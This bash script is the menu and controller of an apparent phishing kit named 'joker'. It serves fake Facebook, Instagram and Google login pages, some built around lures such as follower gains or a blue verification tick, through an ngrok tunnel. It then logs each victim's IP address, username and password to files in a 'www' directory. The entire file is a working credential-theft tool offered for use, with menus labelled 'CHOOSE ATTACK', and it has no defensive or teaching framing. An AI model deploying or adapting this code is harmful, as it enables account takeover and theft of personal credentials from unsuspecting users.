HOST='127.0.0.1'
PORT='8080'
Ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
IP=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
local(){
bash local.sh 
}


ngrok(){
cd $HOME
echo -e "\e[91m \t\t PLEASE ON MOBILE HOTSPOT "
sleep 5.0
echo -e "\e[92m\n\t\t LOCALHOST STARTING... "
sleep 2.0
echo -e "\e[92m \n\t\t NGROK STARTING... "

./ngrok http 8080 > /dev/null 2>1&
sleep 5.0

bash joker/link.sh
echo -e "\e[96m \n \tLOCALHOST : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃  \t\t127.0.0.1:8080                   "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[96m \n \tNGROK LINK : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e " $(cat link.txt)"

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

}

ip(){

if [ -e ip.txt ];
then 
mpv $HOME/joker/cap.mp3 > /dev/null 2>1&

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\n"
echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
echo -e "\e[94m\n┃-------  (SAVE IN IP.TXT)  -------┃"
rm ip.txt
echo -e "\n"
fi
}


if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi

clear
cat bann.txt
option(){
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |       [\e[92m1\e[96m]==> FACEBOOK                   |"
echo -e "\e[96m        |       [\e[92m2\e[96m]==> INSTAGRAM                  |"
echo -e "\e[96m        |       [\e[92m3\e[96m]==> GOOGLE                     |"
echo -e "\e[96m        |       [\e[92m00\e[96m]==> BACK                      |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |===================HACK3R============================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |    NOTE:-  PASSWORD  SAVE IN 'www' DIRECTORY        |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
}
option
read -p "CHOOSE ATTACK : " OP
social(){

if [ $OP == 1 ];
then 
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |       [\e[92m1\e[96m]==> FACEBOOK                   |"
echo -e "\e[96m        |       [\e[92m2\e[96m]==> FB ADVANCE                 |"
echo -e "\e[96m        |       [\e[92m3\e[96m]==> FB SECURITY                |"
echo -e "\e[96m        |       [\e[92m4\e[96m]==> FB MESSENGER               |"
echo -e "\e[96m        |       [\e[92m00\e[96m]==> BACK.                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\n"
read -p "CHOOSE ATTACK : " FB
case $OP in
1)
cd .sites/facebook
local
ngrok
cd joker/.sites/facebook
 
while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/fb.txt
rm usernames.txt 
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  $HOME/joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
2)
cd .sites/fb_advanced
local
ngrok
cd joker/.sites/fb_advanced
while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >>  $HOME/joker/www/fb.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  $HOME/joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
3)
cd .sites/fb_security
local
ngrok
cd joker/.sites/fb_security
while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >>  $HOME/joker/www/fb.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  $HOME/joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
4)
cd .sites/fb_messenger
local
ngrok
cd joker/.sites/fb_messenger

while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >>  $HOME/joker/www/fb.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >>  $HOME/joker/www/fbpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
00)
bash joker.sh
;;
esac

elif [ $OP == 2 ];
then 
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |       [\e[92m1\e[96m]==> INSTAGRAM                  |"
echo -e "\e[96m        |       [\e[92m2\e[96m]==> IG FOLLOWER                |"
echo -e "\e[96m        |       [\e[92m3\e[96m]==> IG FOLLOWERS               |"
echo -e "\e[96m        |       [\e[92m4\e[96m]==> IG BLUE TICK               |"
echo -e "\e[96m        |       [\e[92m00\e[96m]==> BACK                      |"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\n"
read -p "CHOOSE ATTACK : " IG
case $IG in 
1)

cd .sites/instagram
local
ngrok
cd joker/.sites/instagram

while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
2)
cd .sites/ig_followers
local
ngrok
cd joker/.sites/ig_followers

while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/ig.txt
rm usernames.txt
fi
if [ -e passs.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
3)
cd .sites/insta_followers
local
ngrok
cd joker/.sites/insta_followers

while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
4)
cd .sites/ig_verify
local
ngrok
cd joker/.sites/ig_verify

while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/ig.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/igpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
00)
bash joker.sh
;;
esac
elif [ $OP == 3 ];
then
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |       [\e[92m1\e[96m]==> GOOGLE                     |"
echo -e "\e[96m        |       [\e[92m2\e[96m]==> GOOGLE POLL                |"
echo -e "\e[96m        |       [\e[92m3\e[96m]==> GOOGLE NEW                 |"
echo -e "\e[96m        |       [\e[92m00\e[96m]==> BACK                      |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"

echo -e "\n"
read -p "CHOOSE ATTACK : " GG
case $GG in
1)

cd .sites/google
local
ngrok
cd joker/.sites/google
ip
while true;

do
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/google.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/googlepass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
2)
cd .sites/google_poll
local
ngrok
cd joker/.sites/google_poll

while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/google.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/googlepass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
3)
cd .sites/google_new
local
ngrok
cd joker/.sites/google_new

while true;

do
ip
if [ -e usernames.txt ];
then
echo -e "\e[98m \nUSERNAME : $(cat usernames.txt)  "
cat usernames.txt >> $HOME/joker/www/google.txt
rm usernames.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m \nPASSWORD : $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/googlepass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
00)
bash joker.sh
;;

esac
elif [ $OP == 00 ];
then 
bash joker.sh

else
clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |------------------------ERROR------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
sleep 3.0
clear
bash social.sh
fi

}
social 


